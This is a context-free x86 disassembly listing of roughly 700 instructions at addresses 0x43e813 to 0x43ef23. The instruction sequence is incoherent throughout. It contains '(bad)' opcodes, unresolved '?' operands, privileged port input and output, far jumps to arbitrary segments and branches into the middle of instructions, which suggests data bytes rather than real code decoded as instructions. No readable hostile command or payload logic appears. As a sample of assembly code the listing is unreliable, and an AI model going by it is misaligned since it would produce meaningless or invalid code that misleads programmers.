  43e813:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43e814:	push   DWORD PTR [edi-0x1f014b05]
  43e81a:	add    eax,0xeeb20844
  43e81f:	call   0x621d:0x5be75fdc
  43e826:	fmul   DWORD PTR [edi-0x1b8c86eb]
  43e82c:	ret    
  43e82d:	mov    dl,0xb7
  43e82f:	xchg   ecx,eax
  43e830:	scas   al,BYTE PTR es:[edi]
  43e831:	scas   al,BYTE PTR es:[edi]
  43e832:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43e833:	lods   eax,DWORD PTR ds:[esi]
  43e834:	scas   al,BYTE PTR es:[edi]
  43e835:	inc    edx
  43e836:	out    dx,al
  43e837:	mov    bh,0x61
  43e839:	loopne 0x43e855
  43e83b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43e83c:	mov    edx,0x21a0a88b
  43e841:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43e843:	ins    DWORD PTR es:[edi],dx
  43e844:	adc    dl,BYTE PTR [esi+eax*8-0x2d05ce57]
  43e84b:	sub    eax,0xef91e077
  43e850:	lds    ebx,FWORD PTR [ecx+0x71]
  43e853:	test   ebp,ebx
  43e855:	pusha  
  43e856:	or     al,0x5a
  43e858:	jg     0x43e84a
  43e85a:	push   esi
  43e85b:	adc    bh,BYTE PTR [ecx]
  43e85d:	sub    dh,0x29
  43e860:	dec    eax
  43e861:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43e862:	push   ebx
  43e863:	sti    
  43e864:	(bad)  
  43e865:	jp     0x43e8be
  43e867:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43e868:	xor    ecx,ebx
  43e86a:	sti    
  43e86b:	cmp    BYTE PTR [ecx+0x4da4ff92],ah
  43e871:	sub    ebp,DWORD PTR [esi]
  43e873:	jns    0x43e82e
  43e875:	ficomp DWORD PTR [edi-0xf9f5392]
  43e87b:	jne    0x43e8a3
  43e87d:	daa    
  43e87e:	sbb    al,0xb8
  43e880:	cmp    ecx,DWORD PTR [esi-0x654fff12]
  43e886:	jg     0x43e8af
  43e888:	dec    esp
  43e889:	sub    eax,0xa382a0ff
  43e88e:	call   0xa159e9e8
  43e893:	sbb    al,0x63
  43e895:	fadd   QWORD PTR [esi]
  43e897:	jo     0x43e8a7
  43e899:	add    DWORD PTR [esp+eax*8-0x5e828e48],0xf29b2e96
  43e8a4:	or     eax,DWORD PTR [edx+eax*1]
  43e8a7:	in     eax,dx
  43e8a8:	xor    DWORD PTR [ebp+0x79bb20a7],ebx
  43e8ae:	daa    
  43e8af:	cmp    DWORD PTR cs:[edi+0x33],0xffffff90
  43e8b4:	retf   
  43e8b5:	sbb    al,0xc9
  43e8b7:	push   edi
  43e8b8:	inc    edx
  43e8b9:	popa   
  43e8ba:	mov    eax,ds:0x52a2c30a
  43e8bf:	inc    edx
  43e8c0:	pop    esi
  43e8c1:	fist   DWORD PTR [eax-0x19]
  43e8c4:	inc    ebp
  43e8c5:	(bad)  [esi-0x779ee9e5]
  43e8cb:	popf   
  43e8cc:	sbb    eax,0x12632730
  43e8d1:	push   esi
  43e8d2:	out    dx,al
  43e8d3:	xor    al,bl
  43e8d5:	lds    ecx,FWORD PTR [edi]
  43e8d7:	cmp    ch,BYTE PTR [edx-0xd5e8c7e]
  43e8dd:	add    ebp,DWORD PTR [esi+0x5a]
  43e8e0:	imul   ecx,esi,0xe95e1297
  43e8e6:	jns    0x43e93c
  43e8e8:	add    bh,bl
  43e8ea:	sbb    al,0x7a
  43e8ec:	push   esi
  43e8ed:	popa   
  43e8ee:	jo     0x43e8b3
  43e8f0:	(bad)  
  43e8f1:	xchg   esi,eax
  43e8f2:	inc    ebx
  43e8f3:	(bad)  
  43e8f4:	or     al,0x4b
  43e8f6:	out    dx,al
  43e8f7:	rcr    DWORD PTR [ecx+0x67],cl
  43e8fa:	dec    edx
  43e8fb:	adc    bh,BYTE PTR [edi-0xe]
  43e8fe:	mov    fs,WORD PTR [ecx-0x198fc999]
  43e904:	(bad)  
  43e906:	xchg   ebp,eax
  43e907:	xor    dh,BYTE PTR [eax+0x9]
  43e90a:	out    dx,al
  43e90b:	jae    0x43e89f
  43e90d:	jp     0x43e939
  43e90f:	mov    bl,0xbb
  43e911:	push   esp
  43e912:	inc    ebx
  43e913:	sub    DWORD PTR [edi-0x5e60a838],ecx
  43e919:	fsubr  QWORD PTR [edi-0xc]
  43e91c:	fidivr WORD PTR [ebx+0x1e4f9589]
  43e922:	pop    eax
  43e923:	imul   ebx,DWORD PTR [esi+0x5f],0x10
  43e927:	int    0x55
  43e929:	add    ecx,eax
  43e92b:	push   ebx
  43e92c:	add    eax,0xbd01767b
  43e931:	pusha  
  43e932:	and    al,0x67
  43e934:	je     0x43e94b
  43e936:	cmp    dl,ch
  43e938:	pop    esi
  43e939:	xlat   BYTE PTR ds:[ebx]
  43e93a:	or     al,0x42
  43e93c:	pop    ecx
  43e93d:	push   eax
  43e93e:	mov    ch,0x8e
  43e940:	add    ebx,DWORD PTR [edx+0x63]
  43e943:	bound  esp,QWORD PTR [esp+esi*1+0xcde3c64]
  43e94a:	add    bl,BYTE PTR [edi-0x3b11b7f0]
  43e950:	adc    esp,DWORD PTR [edx+edx*4]
  43e953:	mov    cl,0x34
  43e955:	xor    BYTE PTR [ebx-0x169f58ef],ah
  43e95b:	ja     0x43e8e8
  43e95d:	adc    eax,0x4a663f9b
  43e962:	out    dx,al
  43e963:	int3   
  43e964:	test   eax,0x175c35e4
  43e969:	xor    eax,0x5d889f78
  43e96e:	mov    ds:0x9e6d7bdf,eax
  43e973:	inc    ecx
  43e974:	sub    bh,BYTE PTR [edi+0x5f5308c8]
  43e97a:	jle    0x43e901
  43e97c:	pop    esi
  43e97d:	pop    eax
  43e97e:	rcl    ebx,cl
  43e980:	xchg   ah,al
  43e982:	lods   eax,DWORD PTR ds:[esi]
  43e983:	js     0x43e9c5
  43e985:	sub    al,0xc2
  43e987:	mov    eax,ds:0xb35e20db
  43e98c:	xchg   edi,eax
  43e98d:	test   DWORD PTR [ebx],0xe74fa36d
  43e993:	inc    ebp
  43e994:	mov    bh,0x5b
  43e996:	aas    
  43e997:	lods   al,BYTE PTR ds:[esi]
  43e998:	cs add bl,dl
  43e99b:	adc    DWORD PTR [edx+0x44],esp
  43e99e:	fs (bad) 
  43e9a0:	scas   al,BYTE PTR es:[edi]
  43e9a1:	pusha  
  43e9a2:	jmp    0x43e95d
  43e9a4:	mov    DWORD PTR [ebx+0x7e540a68],esp
  43e9aa:	neg    DWORD PTR [edi]
  43e9ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43e9ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43e9ae:	out    0x20,al
  43e9b0:	test   BYTE PTR [ebp+0x28a70035],bh
  43e9b6:	test   BYTE PTR [ecx-0x1837d263],ah
  43e9bc:	jge    0x43e981
  43e9be:	xchg   ecx,eax
  43e9bf:	fistp  DWORD PTR [esi-0x27]
  43e9c2:	aas    
  43e9c3:	aaa    
  43e9c4:	dec    edi
  43e9c5:	inc    ecx
  43e9c6:	fsub   st,st(2)
  43e9c8:	test   DWORD PTR [eax],0x435ed889
  43e9ce:	xchg   ebx,eax
  43e9cf:	inc    ecx
  43e9d0:	push   cs
  43e9d1:	dec    ecx
  43e9d2:	adc    BYTE PTR [ebx],cl
  43e9d4:	pop    esi
  43e9d5:	pop    ss
  43e9d6:	jp     0x43e9c5
  43e9d8:	js     0x43ea47
  43e9da:	test   DWORD PTR [ebx],0xc0264188
  43e9e0:	int3   
  43e9e1:	je     0x43ea45
  43e9e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43e9e4:	out    dx,eax
  43e9e5:	or     eax,0xd68e1f42
  43e9ea:	out    0x33,eax
  43e9ec:	pop    esi
  43e9ed:	mov    DWORD PTR [edx+0x27],ebx
  43e9f0:	pusha  
  43e9f1:	inc    eax
  43e9f2:	aad    0x2
  43e9f4:	and    DWORD PTR [eax+0x12],0xffffff9b
  43e9f8:	retf   
  43e9f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43e9fa:	xchg   ebp,eax
  43e9fb:	aas    
  43e9fc:	mov    esp,esp
  43e9fe:	out    dx,al
  43e9ff:	and    al,BYTE PTR [edi]
  43ea01:	fwait
  43ea02:	shr    DWORD PTR [eax-0x5e704484],0xe4
  43ea09:	sbb    BYTE PTR [ecx],bh
  43ea0b:	xor    BYTE PTR [ecx+0x5e9cc896],bl
  43ea11:	xchg   ecx,eax
  43ea12:	cld    
  43ea13:	jl     0x43e9f1
  43ea15:	fnstsw WORD PTR [ebp+0x6e606b85]
  43ea1b:	sbb    al,0xa9
  43ea1d:	xor    eax,0xf7809563
  43ea22:	out    0x2c,eax
  43ea24:	adc    cl,BYTE PTR [esi+0x4a]
  43ea27:	scas   al,BYTE PTR es:[edi]
  43ea28:	(bad)  
  43ea29:	push   ecx
  43ea2a:	je     0x43e9b5
  43ea2c:	and    esp,DWORD PTR [esi+0x2fd1820e]
  43ea32:	cs test al,0xf0
  43ea35:	push   edx
  43ea36:	inc    edx
  43ea37:	mov    cl,0x3d
  43ea39:	popa   
  43ea3a:	push   edi
  43ea3b:	mov    ebp,0x51eee87f
  43ea40:	and    esi,eax
  43ea42:	les    edi,FWORD PTR ds:[ebp+0x1ba17203]
  43ea49:	cmp    eax,0x5d3bea0e
  43ea4e:	test   eax,0x83af3ccb
  43ea53:	sub    BYTE PTR [esi-0x33],bl
  43ea56:	mov    cl,0xdf
  43ea58:	gs push ds
  43ea5a:	inc    edx
  43ea5b:	mov    eax,ds:0x6f3ebe6d
  43ea60:	aas    
  43ea61:	mov    ebx,0x455d69d7
  43ea66:	scas   al,BYTE PTR es:[edi]
  43ea67:	pop    ebx
  43ea68:	test   eax,0xfe07bcb4
  43ea6d:	mov    bl,0x80
  43ea6f:	mov    eax,ds:0xb428eb14
  43ea74:	mov    edx,0x5ef7ccbc
  43ea79:	xor    BYTE PTR [ecx],0x3b
  43ea7c:	mov    al,0xc3
  43ea7e:	and    al,0x3e
  43ea80:	mov    esi,0xbc5f660
  43ea85:	pusha  
  43ea86:	icebp  
  43ea87:	push   es
  43ea88:	ret    0xeed5
  43ea8b:	jecxz  0x43ea21
  43ea8d:	shl    BYTE PTR [eax+0x53],0xfd
  43ea91:	pop    edx
  43ea92:	out    0xa0,eax
  43ea94:	test   BYTE PTR ds:0xfc5ae571,ch
  43ea9a:	adc    dl,BYTE PTR [esi+0x5e]
  43ea9d:	loope  0x43eb06
  43ea9f:	sub    dh,BYTE PTR [edx-0x14]
  43eaa2:	mov    eax,ds:0x26100d6
  43eaa7:	dec    ebp
  43eaa8:	outs   dx,BYTE PTR ds:[esi]
  43eaa9:	dec    ebx
  43eaaa:	jns    0x43eb1a
  43eaac:	je     0x43ea6a
  43eaae:	out    dx,al
  43eaaf:	sbb    WORD PTR [esi],0x4b
  43eab3:	loope  0x43ea64
  43eab5:	jbe    0x43eaca
  43eab7:	mov    al,ds:0xb1021d36
  43eabc:	pop    ecx
  43eabd:	ror    BYTE PTR [ecx+eiz*1-0x2863ebef],1
  43eac4:	dec    edi
  43eac5:	(bad)  [ecx-0x2d]
  43eac8:	arpl   WORD PTR [eax+ecx*2],ax
  43eacb:	lea    ecx,[edi-0x7]
  43eace:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43eacf:	xor    eax,ecx
  43ead1:	outs   dx,DWORD PTR ds:[esi]
  43ead2:	pop    esp
  43ead3:	gs pop esi
  43ead5:	or     al,BYTE PTR [edx]
  43ead7:	mov    WORD PTR [esi+0x45e2d389],fs
  43eadd:	pop    eax
  43eade:	scas   eax,DWORD PTR es:[edi]
  43eadf:	cmc    
  43eae0:	cmp    ecx,DWORD PTR [ecx]
  43eae2:	addr16 pop ss
  43eae4:	pop    ss
  43eae5:	push   edx
  43eae6:	push   cs
  43eae7:	in     al,dx
  43eae8:	inc    ecx
  43eae9:	out    0x87,eax
  43eaeb:	call   0x4e5e:0xc0f2a9be
  43eaf2:	push   ds
  43eaf3:	lds    esp,FWORD PTR ds:0x3296e4d2
  43eaf9:	popa   
  43eafa:	dec    edx
  43eafb:	or     dl,BYTE PTR [edx+0x63]
  43eafe:	pop    ecx
  43eaff:	(bad)  
  43eb00:	and    bl,BYTE PTR [esi+ebp*8]
  43eb03:	ins    BYTE PTR es:[edi],dx
  43eb04:	fcomp  QWORD PTR [ecx-0x4d59b102]
  43eb0a:	pop    ebp
  43eb0b:	mov    eax,ds:0xf9c63bdf
  43eb10:	fnstcw WORD PTR [eax+eax*1+0xca75e29]
  43eb17:	push   ebx
  43eb18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43eb19:	popf   
  43eb1a:	jmp    FWORD PTR [eax-0x7623bda7]
  43eb20:	test   BYTE PTR [eax],ah
  43eb22:	loopne 0x43eb7d
  43eb24:	ja     0x43eb08
  43eb26:	out    0x40,eax
  43eb28:	pop    ecx
  43eb29:	xor    BYTE PTR cs:[ecx-0x66d16616],0xe6
  43eb31:	pop    es
  43eb32:	clc    
  43eb33:	xchg   esi,eax
  43eb34:	mov    ?,edx
  43eb36:	das    
  43eb37:	mov    eax,ds:0xd0376bdd
  43eb3c:	retf   0xeefb
  43eb3f:	fprem1 
  43eb41:	mov    dh,0x82
  43eb43:	push   ss
  43eb44:	es fdiv st,st(5)
  43eb47:	mov    al,ds:0x99210586
  43eb4c:	mov    ch,0xba
  43eb4e:	cdq    
  43eb4f:	sub    ebx,DWORD PTR [esi-0x40]
  43eb52:	loopne 0x43eb30
  43eb54:	adc    eax,0xa767621d
  43eb59:	pop    ecx
  43eb5a:	pusha  
  43eb5b:	cwde   
  43eb5c:	mov    ebx,0xa0b0d504
  43eb61:	push   esi
  43eb62:	xor    ch,BYTE PTR [edi]
  43eb64:	pop    esi
  43eb65:	inc    eax
  43eb66:	shr    BYTE PTR [esi+0x1b2918ce],cl
  43eb6c:	and    DWORD PTR [ecx+0x13],esp
  43eb6f:	adc    BYTE PTR [edx*1-0x232998e7],al
  43eb76:	out    dx,al
  43eb77:	mov    edx,0x8b4d4bdd
  43eb7c:	mov    edi,0xf5a96503
  43eb81:	mov    dl,0x26
  43eb83:	rcr    esi,cl
  43eb85:	pop    ebp
  43eb86:	outs   dx,BYTE PTR ds:[esi]
  43eb87:	es adc eax,0x5e80f745
  43eb8d:	mov    bh,0x7a
  43eb8f:	mov    dh,0x55
  43eb91:	jns    0x43eba4
  43eb93:	jle    0x43eb49
  43eb95:	pusha  
  43eb96:	jno    0x43ebb2
  43eb98:	jno    0x43ebe8
  43eb9a:	aas    
  43eb9b:	xchg   DWORD PTR [ebx],esi
  43eb9d:	or     ch,dh
  43eb9f:	stos   BYTE PTR es:[edi],al
  43eba0:	pop    ecx
  43eba1:	inc    edx
  43eba2:	leave  
  43eba3:	push   ebp
  43eba4:	lods   eax,DWORD PTR ds:[esi]
  43eba5:	inc    edx
  43eba6:	test   DWORD PTR [ecx-0x5259221e],esp
  43ebac:	fadd   QWORD PTR [edx-0x7ea1e6c6]
  43ebb2:	push   edx
  43ebb3:	shl    BYTE PTR [ebx+edx*4],cl
  43ebb6:	dec    eax
  43ebb7:	test   BYTE PTR [ecx+eiz*2+0x3c],dl
  43ebbb:	cdq    
  43ebbc:	call   0x12fb550
  43ebc1:	ins    DWORD PTR es:[edi],dx
  43ebc2:	out    dx,al
  43ebc3:	lahf   
  43ebc4:	fwait
  43ebc5:	test   DWORD PTR [edx+0x4740ecdd],0x3f607deb
  43ebcf:	push   ss
  43ebd0:	jle    0x25136881
  43ebd6:	out    dx,al
  43ebd7:	mov    dl,0xf0
  43ebd9:	ja     0x43ec4a
  43ebdb:	cmp    dh,al
  43ebdd:	xchg   ecx,eax
  43ebde:	mov    dh,0xa0
  43ebe0:	mov    WORD PTR [eiz*8-0x280c4336],?
  43ebe7:	loope  0x43ebd8
  43ebe9:	repnz xlat BYTE PTR ds:[ebx]
  43ebeb:	jge    0x43ec41
  43ebed:	xchg   esi,eax
  43ebee:	mov    ds:0xee8dfc01,eax
  43ebf3:	aam    0xff
  43ebf5:	xchg   ebx,eax
  43ebf6:	(bad)  
  43ebf7:	nop
  43ebf8:	mov    ebx,0x91bb5d51
  43ebfd:	xor    cl,BYTE PTR [edx]
  43ebff:	fmul   DWORD PTR ds:0xa46916a1
  43ec05:	pushf  
  43ec06:	out    dx,al
  43ec07:	mov    esi,0xf7dcd783
  43ec0c:	cli    
  43ec0d:	add    esi,DWORD PTR ds:0x6e86d9aa
  43ec13:	ins    DWORD PTR es:[edi],dx
  43ec14:	(bad)  
  43ec15:	fs pop edx
  43ec17:	rcl    BYTE PTR [esi+ebp*2],1
  43ec1a:	lock dec DWORD PTR ss:[edi-0x29]
  43ec1f:	and    BYTE PTR [esi],ah
  43ec21:	adc    eax,0x60e98936
  43ec26:	les    edi,FWORD PTR [ebx+ecx*2+0x33]
  43ec2a:	or     dh,BYTE PTR ds:0x3feeb7da
  43ec30:	loopne 0x43ec8b
  43ec32:	sar    DWORD PTR [edi+0x5],0x47
  43ec36:	push   ds
  43ec37:	mov    eax,ds:0xd420536e
  43ec3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43ec3d:	jmp    0xf016:0x245bd9e9
  43ec44:	int3   
  43ec45:	lds    edi,FWORD PTR [esi]
  43ec47:	jae    0x43ec80
  43ec49:	add    al,0x39
  43ec4b:	mov    al,ds:0xeb8f497
  43ec50:	pop    esi
  43ec51:	adc    ecx,0xffffffc4
  43ec54:	sbb    DWORD PTR [ebp+0x54],0x26fd5df3
  43ec5b:	lods   al,BYTE PTR ds:[esi]
  43ec5c:	icebp  
  43ec5d:	dec    edi
  43ec5e:	icebp  
  43ec5f:	outs   dx,BYTE PTR ds:[esi]
  43ec60:	mov    cl,BYTE PTR ds:0x1fca9a11
  43ec66:	sbb    eax,0xce23de9d
  43ec6b:	inc    ebp
  43ec6c:	rcl    ah,0xe7
  43ec6f:	jns    0x43ec76
  43ec71:	push   ss
  43ec72:	jno    0x43ec95
  43ec74:	cdq    
  43ec75:	scas   al,BYTE PTR es:[edi]
  43ec76:	in     al,dx
  43ec77:	dec    esi
  43ec78:	mov    ebx,0x500410cb
  43ec7d:	mov    cl,0x4d
  43ec7f:	out    0x24,al
  43ec81:	and    al,0x8b
  43ec83:	nop
  43ec84:	mov    dh,0x63
  43ec86:	inc    esp
  43ec87:	in     al,dx
  43ec88:	ficom  WORD PTR ds:0x13c44f78
  43ec8e:	pop    ebx
  43ec8f:	outs   dx,DWORD PTR ds:[esi]
  43ec90:	pop    esi
  43ec91:	cmp    DWORD PTR [esi+0x2b],ebp
  43ec94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43ec95:	idiv   DWORD PTR [ebx]
  43ec97:	push   edx
  43ec98:	dec    edx
  43ec99:	pusha  
  43ec9a:	in     al,0x7b
  43ec9c:	push   ss
  43ec9d:	inc    esi
  43ec9e:	test   dl,bh
  43eca0:	sbb    al,0x76
  43eca2:	outs   dx,BYTE PTR ds:[esi]
  43eca3:	daa    
  43eca4:	xchg   edi,eax
  43eca5:	call   0x81768de0
  43ecaa:	call   0x514d:0xcfdadd47
  43ecb1:	fwait
  43ecb2:	or     eax,0x3745dee2
  43ecb7:	xchg   ecx,eax
  43ecb8:	ins    DWORD PTR es:[edi],dx
  43ecb9:	retf   0xa1a1
  43ecbc:	test   BYTE PTR [ebx-0x5f46459c],ah
  43ecc2:	out    dx,eax
  43ecc3:	cmc    
  43ecc4:	pop    esi
  43ecc5:	pop    ds
  43ecc6:	mov    al,ds:0x75083613
  43eccb:	hlt    
  43eccc:	mov    ah,BYTE PTR [eax+0x68]
  43eccf:	sub    ecx,DWORD PTR [ecx-0x15007ee]
  43ecd5:	ss out dx,eax
  43ecd7:	into   
  43ecd8:	or     al,0xff
  43ecda:	sub    esi,eax
  43ecdc:	les    ecx,FWORD PTR [eax+esi*8]
  43ecdf:	dec    edi
  43ece0:	push   edi
  43ece1:	loope  0x43ec71
  43ece3:	shl    BYTE PTR [esi-0x500e4953],cl
  43ece9:	push   ecx
  43ecea:	lods   eax,DWORD PTR ds:[esi]
  43eceb:	in     eax,dx
  43ecec:	pop    eax
  43eced:	adc    eax,0x8f9b064f
  43ecf2:	ja     0x43ecf4
  43ecf4:	jle    0x43ed3b
  43ecf6:	pop    edi
  43ecf7:	dec    esp
  43ecf8:	sbb    DWORD PTR [esi+ebp*8],eax
  43ecfb:	mov    eax,ds:0x61ab84fe
  43ed00:	or     DWORD PTR [edi-0x27],esi
  43ed03:	mov    al,ds:0xec8aaa90
  43ed08:	outs   dx,DWORD PTR ds:[esi]
  43ed09:	and    al,0x25
  43ed0b:	es pop ebx
  43ed0d:	mov    ch,0xe5
  43ed0f:	dec    edx
  43ed10:	xchg   DWORD PTR [edx],ebp
  43ed12:	scas   al,BYTE PTR es:[edi]
  43ed13:	pop    ebp
  43ed14:	(bad)  
  43ed15:	adc    bh,BYTE PTR [ebp-0x37]
  43ed18:	push   0xffffffd8
  43ed1a:	lock bound ebp,QWORD PTR [esi-0x32]
  43ed1e:	into   
  43ed1f:	jl     0x43ed36
  43ed21:	aaa    
  43ed22:	sbb    eax,0x659b5eb4
  43ed27:	cmp    edx,esp
  43ed29:	scas   al,BYTE PTR es:[edi]
  43ed2a:	push   ss
  43ed2b:	daa    
  43ed2c:	cs pop esi
  43ed2e:	cmp    BYTE PTR [ecx],bl
  43ed30:	jmp    0x43ed79
  43ed32:	mov    bl,0x6e
  43ed34:	mov    esi,0x5ee7db41
  43ed39:	push   ds
  43ed3a:	jle    0x43ed65
  43ed3c:	jns    0x43ed36
  43ed3e:	jns    0x43ed32
  43ed40:	mov    al,ds:0x64976763
  43ed45:	sub    eax,0x6e7ea6a4
  43ed4a:	add    al,0x87
  43ed4c:	stc    
  43ed4d:	sbb    al,0xf5
  43ed4f:	popf   
  43ed50:	fisubr DWORD PTR ds:0x35b620fd
  43ed56:	(bad)  
  43ed57:	push   edi
  43ed58:	pop    si
  43ed5a:	clc    
  43ed5b:	aas    
  43ed5c:	int    0xb3
  43ed5e:	test   DWORD PTR [edx-0x2a],eax
  43ed61:	dec    ecx
  43ed62:	jne    0x43edc4
  43ed64:	xor    dl,dh
  43ed66:	into   
  43ed67:	or     esp,esi
  43ed69:	push   fs
  43ed6b:	adc    DWORD PTR [edx+0x60a0f861],ecx
  43ed71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43ed72:	mov    edi,0x89098e51
  43ed77:	add    bl,BYTE PTR [esi-0x1]
  43ed7a:	enter  0x670,0xb3
  43ed7e:	ret    0xe677
  43ed81:	pusha  
  43ed82:	test   eax,0xef384f81
  43ed87:	jb     0x43ee07
  43ed89:	sub    esi,0x430a9992
  43ed8f:	push   ebp
  43ed90:	sub    DWORD PTR [ebx+0x33],ebx
  43ed93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43ed94:	and    BYTE PTR [ebx-0x30],0xf7
  43ed98:	mov    eax,fs
  43ed9a:	push   ds
  43ed9b:	inc    ecx
  43ed9c:	das    
  43ed9d:	or     bh,dl
  43ed9f:	rcr    BYTE PTR [esi+0x32],0xde
  43eda3:	ins    DWORD PTR es:[edi],dx
  43eda4:	frstor [edi+esi*4-0x4f]
  43eda8:	mov    ch,0x60
  43edaa:	popf   
  43edab:	mov    es,WORD PTR [edx+0x74109363]
  43edb1:	inc    eax
  43edb2:	out    dx,al
  43edb3:	mov    ds:0x4fa6979f,eax
  43edb8:	pop    ss
  43edb9:	mov    edi,ss
  43edbb:	jle    0x43ed3e
  43edbd:	pusha  
  43edbe:	stc    
  43edbf:	inc    edi
  43edc0:	or     edx,DWORD PTR [edx+0x41]
  43edc3:	adc    ch,BYTE PTR [ecx-0x42]
  43edc6:	out    dx,al
  43edc7:	push   0x736dfe7d
  43edcc:	cmp    cl,BYTE PTR [edi+0x6b]
  43edcf:	mov    eax,ds:0x20fac389
  43edd4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43edd5:	rol    BYTE PTR [edi],1
  43edd7:	daa    
  43edd8:	pop    ebx
  43edd9:	es (bad) 
  43eddc:	sub    eax,0x4bc69b15
  43ede1:	mov    eax,ds:0x44b57843
  43ede6:	ds adc eax,0x664da072
  43edec:	shr    BYTE PTR [ebx-0x29ba78d],cl
  43edf2:	mov    esp,0xcc00a9de
  43edf7:	ss js  0x43ee0d
  43edfa:	les    esp,FWORD PTR [eax-0x7f2b803b]
  43ee00:	xchg   esi,eax
  43ee01:	cmp    al,0x76
  43ee03:	lock pop esi
  43ee05:	sub    eax,ecx
  43ee07:	mov    ebp,0x5783d990
  43ee0c:	mov    bh,0xf0
  43ee0e:	jnp    0x43ee03
  43ee10:	inc    eax
  43ee11:	or     DWORD PTR [ebp-0x14],ecx
  43ee14:	pop    esi
  43ee15:	outs   dx,BYTE PTR ds:[esi]
  43ee16:	jns    0x43ee45
  43ee18:	enter  0x87e2,0xf9
  43ee1c:	pop    esi
  43ee1d:	pop    esp
  43ee1e:	(bad)  
  43ee1f:	hlt    
  43ee20:	fbstp  TBYTE PTR [edi-0x5c]
  43ee23:	mov    bl,0x96
  43ee25:	pusha  
  43ee26:	cdq    
  43ee27:	psrlw  mm5,mm6
  43ee2a:	mov    edi,0xeeaa3fc5
  43ee2f:	stc    
  43ee30:	sti    
  43ee31:	mov    ch,0x91
  43ee33:	fimul  WORD PTR [ebx-0x4]
  43ee36:	mov    ah,0xab
  43ee38:	xchg   esi,eax
  43ee39:	das    
  43ee3a:	sub    DWORD PTR [ebp+0x2e],0xc314df21
  43ee41:	(bad)  
  43ee43:	out    0x88,eax
  43ee45:	pop    edi
  43ee46:	out    dx,al
  43ee47:	jnp    0x43ee88
  43ee49:	add    eax,0xba7966c8
  43ee4e:	xchg   di,ax
  43ee50:	out    dx,eax
  43ee51:	jbe    0x43ee9e
  43ee53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43ee54:	push   0xffffffa2
  43ee56:	xchg   esi,eax
  43ee57:	stos   BYTE PTR es:[edi],al
  43ee58:	mov    dh,0x1d
  43ee5a:	lods   eax,DWORD PTR ds:[esi]
  43ee5b:	cdq    
  43ee5c:	pop    esi
  43ee5d:	xchg   BYTE PTR [ebx-0xf],bh
  43ee60:	inc    esp
  43ee61:	fmul   QWORD PTR [edx+0x7f607528]
  43ee67:	test   al,0x8e
  43ee69:	enter  0x3b7c,0xb5
  43ee6d:	fadd   DWORD PTR [edi+0x49]
  43ee70:	sahf   
  43ee71:	inc    ecx
  43ee72:	in     al,0x6d
  43ee74:	pop    esi
  43ee75:	aam    0x7b
  43ee77:	cwde   
  43ee78:	popa   
  43ee79:	push   edx
  43ee7a:	cli    
  43ee7b:	aaa    
  43ee7c:	addr16 popa 
  43ee7e:	loop   0x43eef9
  43ee80:	in     al,0xe6
  43ee82:	mov    ?,WORD PTR [esi+0x5d]
  43ee85:	mov    esi,gs
  43ee87:	fcomi  st,st(5)
  43ee89:	clc    
  43ee8a:	xchg   ecx,eax
  43ee8b:	and    al,BYTE PTR [ebx+0x56a0cf33]
  43ee91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43ee92:	sbb    BYTE PTR [ecx+0x2d],0xa3
  43ee96:	push   ebp
  43ee97:	aaa    
  43ee98:	mov    BYTE PTR [edi-0x12],al
  43ee9b:	jno    0x43ee77
  43ee9d:	mov    es,ecx
  43ee9f:	push   ds
  43eea0:	(bad)  
  43eea1:	jecxz  0x43ee8b
  43eea3:	mov    al,ds:0x93003b84
  43eea8:	sar    dh,1
  43eeaa:	in     al,0x72
  43eeac:	pop    esi
  43eead:	mov    ch,0x1e
  43eeaf:	std    
  43eeb0:	fs lahf 
  43eeb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43eeb3:	push   ebp
  43eeb4:	loopne 0x43ef16
  43eeb6:	ins    DWORD PTR es:[edi],dx
  43eeb7:	inc    edi
  43eeb8:	div    bh
  43eeba:	mov    ebp,DWORD PTR [ebp+edi*8-0x38]
  43eebe:	out    dx,al
  43eebf:	stc    
  43eec0:	add    al,0xc6
  43eec2:	aas    
  43eec3:	inc    BYTE PTR [edx]
  43eec5:	jno    0x43ef3c
  43eec7:	test   al,0x9e
  43eec9:	je     0x43eeef
  43eecb:	call   0x65f2c05f
  43eed0:	int    0x39
  43eed2:	add    DWORD PTR [edi-0x346435a2],0xdffa7176
  43eedc:	adc    DWORD PTR [ebp+0x7e],0x1f
  43eee0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43eee1:	mov    edi,0xb3b1156e
  43eee6:	fsub   st(4),st
  43eee8:	adc    dh,BYTE PTR [esi-0x50]
  43eeeb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43eeec:	addr16 pop es
  43eeee:	fcomp  DWORD PTR ds:0xa0c58915
  43eef4:	sbb    al,BYTE PTR ds:0x82d0f66b
  43eefa:	(bad)  
  43eefb:	arpl   WORD PTR [esi-0x34],bx
  43eefe:	pop    esp
  43eeff:	xor    BYTE PTR [ecx],cl
  43ef01:	xor    eax,0x606acf38
  43ef06:	and    edx,DWORD PTR [edx-0x57]
  43ef09:	and    DWORD PTR [edx-0x1faade19],0x114c689d
  43ef13:	or     al,0x87
  43ef15:	xchg   ebp,eax
  43ef16:	in     eax,dx
  43ef17:	or     BYTE PTR [eax+ecx*4+0x74],cl
  43ef1b:	mov    dh,BYTE PTR [ebx-0x38]
  43ef1e:	mov    al,ds:0xcdb18b3e
  43ef23:	and    BYTE PTR [edx-0x7b8eb0a4],al
